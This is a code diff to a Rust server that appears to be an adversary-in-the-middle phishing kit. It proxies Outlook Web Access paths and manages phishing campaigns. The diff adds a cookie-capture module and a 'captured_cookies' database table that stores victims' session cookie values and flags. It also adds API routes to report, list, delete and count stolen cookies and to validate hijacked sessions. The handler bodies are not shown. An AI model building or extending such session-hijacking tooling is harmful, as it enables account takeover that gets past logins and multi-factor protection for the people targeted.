@@ -88,6 +88,9 @@ use tenant_utils::{detect_tenant_fixed, get_location_from_ip};
 mod proxy;
 use proxy::{proxy_handler, proxy_status_handler, proxy_health_check, proxy_test_page, ProxyConfig};
 
+mod cookie_capture;
+use cookie_capture::{cookie_report_handler, get_cookies_handler, delete_cookies_handler, get_cookie_stats_handler, validate_session_handler, CookieCapture};
+
 // ------------------- CONFIGURATION -------------------
 #[derive(Debug, Clone)]
 pub struct AppConfig {
@@ -1377,6 +1380,29 @@ async fn init_db(pool: &SqlitePool) -> Result<(), sqlx::Error> {
         "#
     ).execute(pool).await?;
 
+    // Step 3: Cookie Capture & Storage - captured_cookies table
+    sqlx::query(
+        r#"
+        CREATE TABLE IF NOT EXISTS captured_cookies (
+            id TEXT PRIMARY KEY,
+            token_id TEXT NOT NULL,
+            cookie_name TEXT NOT NULL,
+            cookie_value TEXT NOT NULL,
+            cookie_domain TEXT,
+            cookie_path TEXT,
+            expires_at TEXT,
+            is_httponly INTEGER,
+            is_secure INTEGER,
+            captured_at TEXT NOT NULL
+        )
+        "#
+    ).execute(pool).await?;
+
+    // Add index for faster token_id lookups
+    let _ = sqlx::query(
+        "CREATE INDEX IF NOT EXISTS idx_captured_cookies_token_id ON captured_cookies(token_id)"
+    ).execute(pool).await;
+
     Ok(())
 }
 
@@ -1522,6 +1548,12 @@ async fn main() -> std::io::Result<()> {
             .route("/scripts/{tail:.*}", web::route().to(proxy_handler))
             .route("/owamail/{tail:.*}", web::route().to(proxy_handler))
             .route("/s/{tail:.*}", web::route().to(proxy_handler))
+            // Cookie capture routes - Step 3: Cookie Capture & Storage
+            .route("/api/proxy/cookie-report", web::post().to(cookie_report_handler))
+            .route("/api/proxy/cookies/{token_id}", web::get().to(get_cookies_handler))
+            .route("/api/proxy/cookies/{token_id}", web::delete().to(delete_cookies_handler))
+            .route("/api/proxy/cookies/{token_id}/stats", web::get().to(get_cookie_stats_handler))
+            .route("/api/proxy/cookies/{token_id}/validate", web::get().to(validate_session_handler))
             .route("/api/campaigns", web::get().to(list_campaigns_handler))
             .route("/api/campaigns/create", web::post().to(create_campaign_handler))
             .route("/api/campaigns/{id}", web::get().to(get_campaign_handler))
